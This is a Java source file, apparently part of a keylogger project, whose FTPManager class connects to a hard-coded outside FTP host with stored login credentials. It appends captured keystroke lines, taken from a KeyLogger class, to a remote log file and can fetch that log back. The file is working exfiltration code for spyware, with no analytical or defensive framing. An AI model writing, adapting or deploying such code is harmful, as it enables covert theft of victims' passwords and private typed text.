package org.dot;
import static org.dot.Constants.LOGIN;
import static org.dot.Constants.LOG_LOCAL;
import static org.dot.Constants.LOG_REMOTE;
import static org.dot.Constants.PASSWORD;
import static org.dot.KeyLogger.LINE;

import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.charset.Charset;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;

public class FTPManager {

	public static FTPClient ftp = new FTPClient();
	
	private FTPManager() {}
	
	
	public static boolean connect() throws Exception {
		ftp.connect("dot.do.am");
		ftp.enterLocalPassiveMode();
		ftp.enterRemotePassiveMode();
		ftp.setCharset(Charset.forName("UTF-8"));
		return ftp.login(LOGIN, PASSWORD);
	}
	
	public static boolean upload() throws Exception {
		System.out.println("Writing line \"" + LINE + "\"");
		
		OutputStream out = ftp.appendFileStream(LOG_REMOTE);
		out.write(LINE.getBytes("UTF-8"));
		out.close();
		LINE = "";
		return ftp.completePendingCommand();
	}
	
	public static boolean download() throws Exception {
		ByteArrayOutputStream bytes = new ByteArrayOutputStream();
		OutputStream out = new BufferedOutputStream(bytes);
		
		try {
			ftp.setFileType(FTP.BINARY_FILE_TYPE);
			boolean b = ftp.retrieveFile(LOG_REMOTE, out);
			bytes.close();
			out.close();
			String s = bytes.toString("UTF-8");
			PrintWriter pw = new PrintWriter(LOG_LOCAL);
			pw.print(s);
			pw.close();
			return b;
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			out.close();
		}
		return false;
	}
}
